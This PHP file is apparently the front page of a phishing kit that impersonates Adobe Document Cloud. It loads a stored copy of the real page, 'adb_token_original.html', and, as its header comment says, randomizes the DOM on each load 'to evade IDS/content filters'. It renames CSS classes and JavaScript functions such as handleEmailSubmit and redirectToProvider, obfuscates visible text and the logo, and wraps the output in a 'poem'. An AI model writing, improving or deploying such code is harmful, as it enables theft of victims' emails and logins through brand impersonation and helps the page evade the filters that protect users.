<?php
/**
 * Obfuscated Adobe Document Cloud Landing Page
 * DOM randomized on every load to evade IDS/content filters
 */

require_once __DIR__ . '/obfuscator.php';
require_once __DIR__ . '/config.php';

// Start output buffering
ob_start();

// Generate random IDs for this page load
$rnd = function() use ($obfuscator) {
    return $obfuscator->randomId();
};

$rattr = function($count = 3) use ($obfuscator) {
    return $obfuscator->randomAttributes($count);
};

$txt = function($text) use ($obfuscator) {
    return $obfuscator->obfuscateText($text, 0.2);
};

// Obfuscate images
$logoImg = $obfuscator->obfuscateImage(__DIR__ . '/ad0be.png');

// Random variable names for JavaScript
$jsVars = [
    'docList' => $rnd(),
    'emailInput' => $rnd(),
    'selectedDocs' => $rnd(),
    'lightbox' => $rnd(),
    'loadingOverlay' => $rnd(),
];

?><!DOCTYPE html>
<html lang="en" <?= $rattr() ?>>
<head <?= $rattr() ?>>
    <meta charset="UTF-8" <?= $rattr(2) ?>>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" <?= $rattr(2) ?>>
    <title><?= $txt('Document Cloud - Secure Portal') ?></title>
    <link rel="preconnect" href="https://fonts.googleapis.com" <?= $rattr(1) ?>>
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin <?= $rattr(1) ?>>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" <?= $rattr(1) ?>>
   <style <?= $rattr(2) ?>>
   <?php
   // Read and randomize CSS class names
   $css = file_get_contents(__DIR__ . '/adb_token_original.html');
   preg_match('/<style[^>]*>(.*?)<\/style>/s', $css, $styleMatch);
   $originalStyles = $styleMatch[1] ?? '';
   
   // Generate random class mappings
   $classMap = [];
   preg_match_all('/\.([a-zA-Z_-][a-zA-Z0-9_-]*)/', $originalStyles, $classMatches);
   foreach (array_unique($classMatches[1]) as $className) {
       $classMap[$className] = 'c' . substr(md5($className . microtime() . random_bytes(8)), 0, 12);
   }
   
   // Replace class names in CSS
   $randomizedCSS = $originalStyles;
   foreach ($classMap as $old => $new) {
       $randomizedCSS = preg_replace('/\.' . preg_quote($old, '/') . '\b/', '.' . $new, $randomizedCSS);
   }
   
   echo $randomizedCSS;
   ?>
   </style>
   <script <?= $rattr(2) ?>>var <?= $rnd() ?>=<?= mt_rand(1000, 9999) ?>;</script>
</head>
<body <?= $rattr(3) ?>>
    <div class="<?= $classMap['loading-overlay'] ?? 'loading-overlay' ?>" id="<?= $jsVars['loadingOverlay'] ?>" <?= $rattr(2) ?>>
        <div class="<?= $classMap['loading-content'] ?? 'loading-content' ?>" <?= $rattr(2) ?>>
            <div class="<?= $classMap['loading-spinner'] ?? 'loading-spinner' ?>" <?= $rattr(1) ?>></div>
            <div class="<?= $classMap['loading-text'] ?? 'loading-text' ?>" <?= $rattr(1) ?>><?= $txt('Loading document information...') ?></div>
        </div>
    </div>

    <div class="<?= $classMap['header'] ?? 'header' ?>" <?= $rattr(3) ?>>
        <div class="<?= $classMap['header-container'] ?? 'header-container' ?>" <?= $rattr(2) ?>>
          <div class="<?= $classMap['logo-container'] ?? 'logo-container' ?>" <?= $rattr(2) ?>>
            <img class="<?= $classMap['brand-wordmark'] ?? 'brand-wordmark' ?>" src="<?= $logoImg ?>" alt="<?= $txt('Document Cloud') ?>" style="width:210px; height:85px" <?= $rattr(3) ?>>
          </div>
            <div class="<?= $classMap['header-actions'] ?? 'header-actions' ?>" <?= $rattr(2) ?>>
                <button class="<?= $classMap['header-btn'] ?? 'header-btn' ?>" <?= $rattr(3) ?>>
                    <span <?= $rattr(1) ?>>👤</span>
                    <span <?= $rattr(1) ?>><?= $txt('Account') ?></span>
                </button>
            </div>
        </div>
    </div>

    <!-- Continue with rest of HTML structure with obfuscation -->
    <?php
    // For brevity, I'll inline the core JavaScript with variable obfuscation
    $htmlContent = file_get_contents(__DIR__ . '/adb_token_original.html');
    
    // Extract body content
    preg_match('/<div class="main-container">(.*?)<script>/s', $htmlContent, $bodyMatch);
    $bodyContent = $bodyMatch[1] ?? '';
    
    // Replace class names
    foreach ($classMap as $old => $new) {
        $bodyContent = preg_replace('/class="([^"]*\b)' . preg_quote($old, '/') . '(\b[^"]*)"/', 'class="$1' . $new . '$2"', $bodyContent);
    }
    
    // Add random attributes to major elements
    $bodyContent = preg_replace_callback('/<(div|span|button|input|form|section)([^>]*)>/', function($m) use ($rattr) {
        return '<' . $m[1] . $m[2] . ' ' . $rattr(mt_rand(2,4)) . '>';
    }, $bodyContent);
    
    // Obfuscate text content
    $bodyContent = preg_replace_callback('/>([^<]+)</s', function($m) use ($txt) {
        if (trim($m[1])) {
            return '>' . $txt($m[1]) . '<';
        }
        return $m[0];
    }, $bodyContent);
    
    echo $bodyContent;
    ?>

    <script <?= $rattr(3) ?>>
    <?php
    // Extract and obfuscate JavaScript
    preg_match('/<script[^>]*>(.*?)<\/script>/s', $htmlContent, $jsMatch);
    $originalJS = end($jsMatch);
    
    // Replace function names with random ones
    $jsFunctions = ['loadSettings', 'initializePage', 'fetchDoc', 'logVisit', 'redirectToProvider', 'handleEmailSubmit'];
    $jsFunctionMap = [];
    foreach ($jsFunctions as $func) {
        $jsFunctionMap[$func] = '_' . substr(md5($func . microtime()), 0, 10);
    }
    
    $obfuscatedJS = $originalJS;
    foreach ($jsFunctionMap as $old => $new) {
        $obfuscatedJS = preg_replace('/\b' . $old . '\b/', $new, $obfuscatedJS);
    }
    
    // Replace variable names
    foreach ($jsVars as $old => $new) {
        $obfuscatedJS = preg_replace('/\b' . $old . '\b/', $new, $obfuscatedJS);
    }
    
    // Add random no-op code
    $obfuscatedJS = "var _x" . $rnd() . "=" . mt_rand(1000,9999) . ";\n" . $obfuscatedJS;
    
    echo $obfuscatedJS;
    ?>
    </script>
</body>
</html>
<?php
// Get the buffered content
$finalHTML = ob_get_clean();

// Apply full obfuscation and poem wrap
$fullyObfuscated = $obfuscator->wrapWithPoem($finalHTML);

// Output
echo $fullyObfuscated;
?>
